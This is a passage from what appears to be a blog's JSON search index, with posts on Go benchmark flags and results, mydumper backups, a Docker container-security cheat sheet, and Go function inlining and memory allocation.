上述结果解读代表 1 秒内运行了 250 次，每次 4682682 ns -12 后缀和用于运行次测试的 GOMAXPROCS 值有关。与 GOMAXPROCS 一样，此数字默认为启动时 Go 进程可见的 CPU 数。可以使用 -cpu 标识更改此值，可以传入多个值以列表形式来运行基准测试 传入 cpu num 进行测试 ➜ go test -bench=. -cpu=1,2,4 -benchmem -run=none goos: darwin goarch: amd64 pkg: pkg06 cpu: Intel(R) Core(TM) i7-8850H CPU @ 2.60GHz BenchmarkFib 244 4694667 ns/op 0 B/op 0 allocs/op BenchmarkFib-2 255 4721201 ns/op 0 B/op 0 allocs/op BenchmarkFib-4 256 4756392 ns/op 0 B/op 0 allocs/op PASS ok pkg06 5.826s count 多次运行基准测试 因为热缩放、内存局部性、后台处理、gc 活动等等会导致单次的误差，所以一般会进行多次测试\n➜ go test -bench=. -count=10 -benchmem -run=none goos: darwin goarch: amd64 pkg: pkg06 cpu: Intel(R) Core(TM) i7-8850H CPU @ 2.60GHz BenchmarkFib-12 217 5993577 ns/op 0 B/op 0 allocs/op BenchmarkFib-12 246 5065577 ns/op 0 B/op 0 allocs/op BenchmarkFib-12 244 4955397 ns/op 0 B/op 0 allocs/op BenchmarkFib-12 255 4689529 ns/op 0 B/op 0 allocs/op BenchmarkFib-12 254 4879802 ns/op 0 B/op 0 allocs/op BenchmarkFib-12 254 4691213 ns/op 0 B/op 0 allocs/op BenchmarkFib-12 255 4772108 ns/op 0 B/op 0 allocs/op BenchmarkFib-12 240 4724141 ns/op 0 B/op 0 allocs/op BenchmarkFib-12 255 4717087 ns/op 0 B/op 0 allocs/op BenchmarkFib-12 255 4787803 ns/op 0 B/op 0 allocs/op PASS ok pkg06 18.166s benchtime 指定运行秒数 有的函数比较慢，为了更精确的结果，可以通过-benchtime 标志指定运行时间，从而使它运行更多次\n➜ go test -bench=. -benchtime=5s -benchmem -run=none goos: darwin goarch: amd64 pkg: pkg06 cpu: Intel(R) Core(TM) i7-8850H CPU @ 2.60GHz BenchmarkFib-12 1128 4716535 ns/op 0 B/op 0 allocs/op PASS ok pkg06 7.199s ResetTimer 重置定时器 能在真正测试之前还需要做很多例如初始化等工作，这时可以在需要测试的函数执行之初添加一个重置定时器的功能，这样最终得到的时间就更为精确\npackage pkg06 import ( \u0026#34;testing\u0026#34; \u0026#34;time\u0026#34; ) func BenchmarkFib(b *testing.B) { time.Sleep(3 * time.Second) b.ResetTimer() for n := 0; n \u0026lt; b.N; n++ { fib(30) } } ➜ go test -bench=. -benchtime=5s -benchmem -run=none goos: darwin goarch: amd64 pkg: pkg06 cpu: Intel(R) Core(TM) i7-8850H CPU @ 2.60GHz BenchmarkFib-12 1239 4712413 ns/op 0 B/op 0 allocs/op PASS ok pkg06 16.122s benchmem 展示内存消耗 例如测试大 cap 的切片，直接用 cap 初始化和 cap 动态扩容进行对比 package pkg08 import ( \u0026#34;math/rand\u0026#34; \u0026#34;testing\u0026#34; \u0026#34;time\u0026#34; ) // 指定大的cap的切片 func generateWithCap(n int) []int { rand.Seed(time.Now().UnixNano()) nums := make([]int, 0, n) for i := 0; i \u0026lt; n; i++ { nums = append(nums, rand.Int()) } return nums } // 动态扩容的slice func generateDynamic(n int) []int { rand.Seed(time.Now().UnixNano()) nums := make([]int, 0) for i := 0; i \u0026lt; n; i++ { nums = append(nums, rand.Int()) } return nums } func benchmarkGenerate(i int, b *testing.B) { for n := 0; n \u0026lt; b.N; n++ { generateDynamic(i) } } func BenchmarkGenerateDynamic1000(b *testing.B) { benchmarkGenerate(1000, b) } func BenchmarkGenerateDynamic10000(b *testing.B) { benchmarkGenerate(10000, b) } func BenchmarkGenerateDynamic100000(b *testing.B) { benchmarkGenerate(100000, b) } func BenchmarkGenerateDynamic1000000(b *testing.B) { benchmarkGenerate(1000000, b) } func BenchmarkGenerateDynamic10000000(b *testing.B) { benchmarkGenerate(10000000, b) } ➜ go test -bench=. -benchmem -run=none goos: darwin goarch: amd64 pkg: pkg08 cpu: Intel(R) Core(TM) i7-8850H CPU @ 2.60GHz BenchmarkGenerateDynamic1000-12 39540 26557 ns/op 16376 B/op 11 allocs/op BenchmarkGenerateDynamic10000-12 5452 210894 ns/op 386296 B/op 20 allocs/op BenchmarkGenerateDynamic100000-12 572 2106325 ns/op 4654341 B/op 30 allocs/op BenchmarkGenerateDynamic1000000-12 48 23070939 ns/op 45188416 B/op 40 allocs/op BenchmarkGenerateDynamic10000000-12 5 212567041 ns/op 423503110 B/op 50 allocs/op PASS ok pkg08 9.686s ","date":"September 2, 2021","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210902-golang-ji-zhun-ce-shi/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mp.weixin.qq.com/s?__biz=MzkxNzAzNDA3Ng==\u0026amp;mid=2247485595\u0026amp;idx=1\u0026amp;sn=9981e6103a6b33cc3a06be0781a2bf10\u0026amp;chksm=c1478da8f63004be44a8c84941280f3888d4e5a2120a4288ed1a21f8a1a82fe65d719c31bae6#rd\" target=\"_blank\" rel=\"noopener\"\u003eGolang 基准测试\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"基本使用\"\u003e基本使用\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e基准测试常用于代码性能测试，函数需要导入 testing 包，并定义以 Benchmark 开头的函数， 参数为 testing.B 指针类型，在测试函数中循环调用函数多次\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e➜  go test -bench\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e. -run\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enone\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egoos: darwin\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egoarch: amd64\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epkg: pkg06\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecpu: Intel\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eR\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e Core\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eTM\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e i7-8850H CPU @ 2.60GHz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkFib-12              \u003cspan style=\"color:#ae81ff\"\u003e250\u003c/span\u003e           \u003cspan style=\"color:#ae81ff\"\u003e4682682\u003c/span\u003e ns/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePASS\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eok      pkg06   1.875s\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e➜  go test -bench\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e. -benchmem -run\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enone\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egoos: darwin\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egoarch: amd64\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epkg: pkg06\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecpu: Intel\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eR\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e Core\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eTM\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e i7-8850H CPU @ 2.60GHz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkFib-12              \u003cspan style=\"color:#ae81ff\"\u003e249\u003c/span\u003e           \u003cspan style=\"color:#ae81ff\"\u003e4686452\u003c/span\u003e ns/op               \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e B/op          \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e allocs/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePASS\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eok      pkg06   1.854s\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"bench-的工作原理\"\u003ebench 的工作原理\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e基准测试函数会被一直调用直到 \u003ccode\u003eb.N\u003c/code\u003e 无效，它是基准测试循环的次数\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eb.N\u003c/code\u003e 从 \u003ccode\u003e1\u003c/code\u003e 开始，如果基准测试函数在 \u003ccode\u003e1\u003c/code\u003e 秒内就完成 (默认值)，则 \u003ccode\u003eb.N\u003c/code\u003e 增加，并再次运行基准测试函数\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eb.N\u003c/code\u003e 的值会按照序列 \u003ccode\u003e1,2,5,10,20,50,...\u003c/code\u003e 增加，同时再次运行基准测测试函数\u003c/li\u003e\n\u003cli\u003e上述结果解读代表 \u003ccode\u003e1\u003c/code\u003e 秒内运行了 \u003ccode\u003e250\u003c/code\u003e 次，每次 \u003ccode\u003e4682682 ns\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-12\u003c/code\u003e 后缀和用于运行次测试的 \u003ccode\u003eGOMAXPROCS\u003c/code\u003e 值有关。与 \u003ccode\u003eGOMAXPROCS\u003c/code\u003e 一样，此数字默认为启动时 Go 进程可见的 CPU 数。可以使用 \u003ccode\u003e-cpu\u003c/code\u003e 标识更改此值，可以传入多个值以列表形式来运行基准测试\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"传入-cpu-num-进行测试\"\u003e传入 cpu num 进行测试\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e➜  go test -bench\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e. -cpu\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e1,2,4  -benchmem -run\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enone\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egoos: darwin\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egoarch: amd64\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epkg: pkg06\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecpu: Intel\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eR\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e Core\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eTM\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e i7-8850H CPU @ 2.60GHz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkFib                 \u003cspan style=\"color:#ae81ff\"\u003e244\u003c/span\u003e           \u003cspan style=\"color:#ae81ff\"\u003e4694667\u003c/span\u003e ns/op               \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e B/op          \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e allocs/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkFib-2               \u003cspan style=\"color:#ae81ff\"\u003e255\u003c/span\u003e           \u003cspan style=\"color:#ae81ff\"\u003e4721201\u003c/span\u003e ns/op               \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e B/op          \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e allocs/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkFib-4               \u003cspan style=\"color:#ae81ff\"\u003e256\u003c/span\u003e           \u003cspan style=\"color:#ae81ff\"\u003e4756392\u003c/span\u003e ns/op               \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e B/op          \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e allocs/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePASS\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eok      pkg06   5.826s\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"count-多次运行基准测试\"\u003ecount 多次运行基准测试\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e因为热缩放、内存局部性、后台处理、gc 活动等等会导致单次的误差，所以一般会进行多次测试\u003c/p\u003e","tags":["URL","Go","Benchmark","Testing"],"title":"Golang基准测试"},{"categories":["URL","Database","MySQL","MyDumper"],"contents":" 使用 mydumper 备份数据库 MyDumper ","date":"September 1, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210901-mydumper/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.bboy.app/2021/08/09/%E4%BD%BF%E7%94%A8mydumper%E5%A4%87%E4%BB%BD%E6%95%B0%E6%8D%AE%E5%BA%93/\" target=\"_blank\" rel=\"noopener\"\u003e使用 mydumper 备份数据库\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/mydumper/mydumper\" target=\"_blank\" rel=\"noopener\"\u003eMyDumper\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Database","MySQL","MyDumper"],"title":"使用mydumper备份数据库"},{"categories":["URL","Docker"],"contents":" Docker Security Best Practices: Cheat Sheet Image Security Use Trusted Images Unprivileged User FROM base_image RUN addgroup -S appgroup \u0026amp;\u0026amp; adduser -S appuser -G appgroup USER appuser User ID Namespace Segregate namespaces to prevent container privilege escalation from affecting the host.\nTo mitigate this risk, configure your host and the Docker daemon to use a separate namespace with the --userns-remap option.\nContainer Runtime Security Forbid New Privileges For enhanced security, it is recommended to explicitly forbid the addition of new privileges after container creation using this option: --security-opt=no-new-privileges.\nDefine Fine-grained Capabilities For example, a web server would probably only need the NET_BIND_SERVICE capability to bind the port 80.\nControl Group Utilization docker run --memory=\u0026quot;400m\u0026quot; --cpus=\u0026quot;0.5\u0026quot; Host System Security Sensitive Filesystem Parts If you need access to host devices, be careful to selectively enable the access options with the [r|w|m] flags (read, write, and use mknod).\nContainer Filesystem Access docker run --read-only --tmpfs /tmp:rw ,noexec,nosuid Persistent Storage If you need to share data with the host filesystem or other containers, you have two options:\nCreate a bind mount with limited useable disk space (--mount type=bind,o=size) Create a bind volume for a dedicated partition (--mount type=volume) Network Security Docker Daemon Socket Docker The UNIX socket used by the Docker should not be exposed: /var/run/docker.sock\nCustom Network Bridges Avoid Docker\u0026rsquo;s default docker0 network bridge; create custom networks for container isolation.\nDocker Security Scanning and Vulnerability Management Base Image Scanning: Regularly scan base images for known CVEs using tools like Trivy Snyk Clair ggshield Dependency Analysis Runtime Monitoring Continuous Integration # Scan image before deployment trivy image myapp:latest --severity HIGH,CRITICAL # Fail build if critical vulnerabilities found trivy image myapp:latest --exit-code 1 --severity CRITICAL Docker Secrets Management and Configuration Security Docker Secrets Service # Create and use Docker secret echo \u0026#34;my_secret_password\u0026#34; | docker secret create db_password - docker service create --secret db_password myapp:latest External Secret Management: Integrate with enterprise secret management solutions like\nHashiCorp Vault AWS Secrets Manager Azure Key Vault Environment Variable Security: When environment variables are necessary, use init containers or sidecar patterns to fetch secrets at runtime rather than embedding them in images. Never include secrets in Dockerfiles or commit them to version control.\nSecret Scanning: Implement automated secret detection tools like GitGuardian\u0026rsquo;s ggshield to scan container images and source code for accidentally exposed credentials. This prevents secrets from entering your container supply chain.\nDocker Registry Security and Supply Chain Protection Registry Access Controls: Implement role-based access control (RBAC) with least-privilege principles. Use strong authentication mechanisms like multi-factor authentication and service accounts with limited scopes for automated systems. Image Signing and Verification: Deploy Docker Content Trust or Notary to cryptographically sign images and verify their integrity. This ensures images haven\u0026rsquo;t been tampered with during storage or transmission. # Enable content trust export DOCKER_CONTENT_TRUST=1 docker push myregistry.com/myapp:latest Registry Scanning: Configure your registry to automatically scan pushed images for vulnerabilities and malware. Implement admission controllers that prevent deployment of images failing security policies. Supply Chain Monitoring Network Security: Secure registry communications using TLS encryption and restrict network access through firewalls or VPNs. Consider using private registries for sensitive applications rather than public repositories. ","date":"August 20, 2021","hero":"/images/hero/docker.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210820-how-to-improve-your-docker-containers-security-cheat-sheet/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.gitguardian.com/how-to-improve-your-docker-containers-security-cheat-sheet/\" target=\"_blank\" rel=\"noopener\"\u003eDocker Security Best Practices: Cheat Sheet\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"image-security\"\u003eImage Security\u003c/h3\u003e\n\u003ch4 id=\"use-trusted-images\"\u003eUse Trusted Images\u003c/h4\u003e\n\u003ch4 id=\"unprivileged-user\"\u003eUnprivileged User\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e base_image\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eRUN\u003c/span\u003e addgroup -S appgroup \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e adduser -S appuser -G appgroup\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eUSER\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e appuser\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"user-id-namespace\"\u003eUser ID Namespace\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003eSegregate namespaces to prevent container privilege escalation from affecting the host.\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eTo mitigate this risk, configure your host and the Docker daemon to use a separate namespace with the \u003ccode\u003e--userns-remap\u003c/code\u003e option.\u003c/p\u003e\n\u003ch3 id=\"container-runtime-security\"\u003eContainer Runtime Security\u003c/h3\u003e\n\u003ch4 id=\"forbid-new-privileges\"\u003eForbid New Privileges\u003c/h4\u003e\n\u003cp\u003eFor enhanced security, it is recommended to explicitly forbid the addition of new privileges after container creation using this option: \u003ccode\u003e--security-opt=no-new-privileges\u003c/code\u003e.\u003c/p\u003e","tags":["URL","Docker"],"title":"Docker Security Best Practices: Cheat Sheet"},{"categories":["URL","Go"],"contents":" [译] Go 语言 inline 内联的策略与限制 Go: Inlining Strategy \u0026amp; Limitation Visualizing memory management in Golang Understanding Allocations in Go package main import \u0026#34;fmt\u0026#34; func main() { n := []float32{120.4, -46.7, 32.50, 34.65, -67.45} fmt.Printf(\u0026#34;The total is %.02f\\n\u0026#34;, sum(n)) } func sum(s []float32) float32 { var t float32 for _, v := range s { if t \u0026lt; 0 { t = add(t, v) } else { t = sub(t, v) } } return t } func add(a, b float32) float32 { return a + b } func sub(a, b float32) float32 { return a - b } 使用参数-gflags=\u0026quot;-m\u0026quot;运行，可显示被内联的函数\n./op.go:3:6: can inline add ./op.go:7:6: can inline sub ./main.go:16:11: inlining call to sub ./main.go:14:11: inlining call to add ./main.go:7:12: inlining call to fmt.Printf 可以看到 add 方法被内联了。但是，为什么 sum 方法没有被内联呢？使用运行参数-gflags=\u0026quot;-m -m\u0026quot;可以看到原因：\n./main.go:10:6: cannot inline sum: unhandled op RANGE Go 不会内联包含循环的方法。实际上，包含以下内容的方法都不会被内联：\n闭包调用 select for defer go 关键字创建的协程。 并且除了这些，还有其它的限制。当解析 AST 时，Go 申请了 80 个节点作为内联的预算。每个节点都会消耗一个预算。\n比如，a = a + 1 这行代码包含了 5 个节点：AS, NAME, ADD, NAME, LITERAL。\n当一个函数的开销超过了这个预算，就无法内联。以下是一个更复杂的 add 函数对应的输出：\n/op.go:3:6: cannot inline add: function too complex: cost 104 exceeds budget 80 内联带来的性能提升 内联是高性能编程的一种重要手段。每个函数调用都有开销：创建栈帧，读写寄存器，这些开销可以通过内联避免。\n但话说回来，对函数体进行拷贝也会增大二进制文件的大小。以下是内联与非内联时的一个 benchmark 对比：\nname old time/op new time/op delta BinaryTree17-8 2.34s ± 2% 2.43s ± 3% +3.77% Fannkuch11-8 2.21s ± 1% 2.26s ± 1% +2.01% FmtFprintfEmpty-8 33.6ns ± 6% 35.2ns ± 3% +4.85% FmtFprintfString-8 55.3ns ± 3% 62.8ns ± 1% +13.48% FmtFprintfInt-8 63.1ns ± 3% 70.0ns ± 2% +11.04% FmtFprintfIntInt-8 95.9ns ± 3% 102.3ns ± 3% +6.68% FmtFprintfPrefixedInt-8 105ns ± 4% 111ns ± 1% +5.83% FmtFprintfFloat-8 165ns ± 4% 175ns ± 1% +6.16% FmtManyArgs-8 405ns ± 2% 427ns ± 0% +5.38% GobDecode-8 4.69ms ± 2% 4.78ms ± 4% +1.77% GobEncode-8 3.84ms ± 2% 3.93ms ± 3% ~ Gzip-8 210ms ± 3% 208ms ± 1% ~ Gunzip-8 28.1ms ± 7% 29.4ms ± 1% +4.69% HTTPClientServer-8 70.0µs ± 2% 70.9µs ± 1% +1.21% JSONEncode-8 7.28ms ± 5% 7.00ms ± 2% -3.91% JSONDecode-8 33.9ms ± 3% 33.1ms ± 1% -2.32% Mandelbrot200-8 3.74ms ± 0% 3.74ms ± 1% ~ 内联的性能大概要好 5~6%左右。\nMemory Allocation Tiny(size \u0026lt; 16B): Objects of size less than 16 bytes are allocated using the mcache\u0026rsquo;s tiny allocator. This is efficient and multiple tiny allocations are done on a single 16-byte block. Small(size 16B ~ 32KB): Objects of size between 16 bytes and 32 Kilobytes are allocated on the corresponding size class(mspan) on mcache of the P where the G is running. In both tiny and small allocation if the mspan\u0026rsquo;s list is empty the allocator will obtain a run of pages from the mheap to use for the mspan. If the mheap is empty or has no page runs large enough then it allocates a new group of pages (at least 1MB) from the OS.\nLarge(size \u0026gt; 32KB): Objects of size greater than 32 kilobytes are allocated directly on the corresponding size class of mheap. If the mheap is empty or has no page runs large enough then it allocates a new group of pages (at least 1MB) from the OS. ","date":"August 14, 2021","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210814-go-inlining-strategy-limitation/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.pengrl.com/p/20028/\" target=\"_blank\" rel=\"noopener\"\u003e[译] Go 语言 inline 内联的策略与限制\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/a-journey-with-go/go-inlining-strategy-limitation-6b6d7fc3b1be\" target=\"_blank\" rel=\"noopener\"\u003eGo: Inlining Strategy \u0026amp; Limitation\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://deepu.tech/memory-management-in-golang/\" target=\"_blank\" rel=\"noopener\"\u003eVisualizing memory management in Golang\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/eureka-engineering/understanding-allocations-in-go-stack-heap-memory-9a2631b5035d\" target=\"_blank\" rel=\"noopener\"\u003eUnderstanding Allocations in Go\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003efloat32\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e120.4\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e46.7\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e32.50\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e34.65\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e67.45\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;The total is %.02f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003esum\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esum\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003efloat32\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003efloat32\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efloat32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ev\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003erange\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan 